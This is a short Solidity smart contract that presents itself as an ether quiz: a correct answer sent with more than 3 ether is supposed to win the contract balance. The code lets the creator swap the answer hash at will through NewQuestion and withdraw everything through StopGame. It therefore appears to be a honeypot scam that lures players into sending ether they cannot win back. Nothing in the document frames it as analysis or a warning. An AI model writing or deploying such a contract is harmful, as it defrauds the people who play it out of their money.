pragma solidity ^0.4.20;

contract Win_Some_Ether
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    string public question;
 
    address questionSender;
  
    bytes32 responseHash;
 
    function init_quiz_game(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            
            question = _question;
            
            questionSender = msg.sender;
        }
    }
    
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       
       msg.sender.transfer(this.balance);
    }
    
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        
        question = _question;
        
        responseHash = _responseHash;
    }
    
    function() public payable{}
}